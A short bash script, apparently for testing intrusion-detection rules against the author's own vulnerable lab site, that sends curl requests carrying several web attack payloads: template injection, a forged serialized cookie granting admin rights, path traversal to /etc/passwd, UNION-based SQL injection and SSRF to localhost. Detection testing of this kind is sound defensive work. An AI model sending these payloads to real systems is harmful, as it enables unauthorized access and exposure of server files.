#!/bin/bash
TARGET="https://mrahmatt74.com/modules"

echo "Running Loud Attack Simulation..."

# 1. SSTI dengan karakter yang memicu rule
curl -s -o /dev/null "${TARGET}/injection/ssti.php?name=%7B%7B7*7%7D%7D"

# 2. Insecure Deserialization (Kirim via Cookie)
# Kita kirim payload yang sudah dimodifikasi (is_admin:1)
curl -s -o /dev/null -H "Cookie: user_session=TzoxMToiVXNlclByb2ZpbGUiOjM6e3M6ODoidXNlcm5hbWUiO3M6MTA6Im1yYWhtYXR0NzQiO3M6NDoicm9sZSI7czoxMjoiR2VuZXJhbCBVc2VyIjtzOjg6ImlzX2FkbWluIjtiOjE7fQ==" "${TARGET}/broken_auth/insecure_des.php"

# 3. Path Traversal (Gunakan /etc/passwd agar kena rule 31104)
curl -s -o /dev/null "${TARGET}/server_side/path_traversal.php?file=../../../../etc/passwd"

# 4. SQLi (Gunakan UNION SELECT agar kena rule 31103)
curl -s -o /dev/null "${TARGET}/injection/sqli.php?id=1%27%20UNION%20SELECT%201,2,3%23"

# 5. SSRF
curl -s -o /dev/null "${TARGET}/server_side/ssrf.php?url=http://127.0.0.1"

echo "Done. Cek Dashboard sekarang."
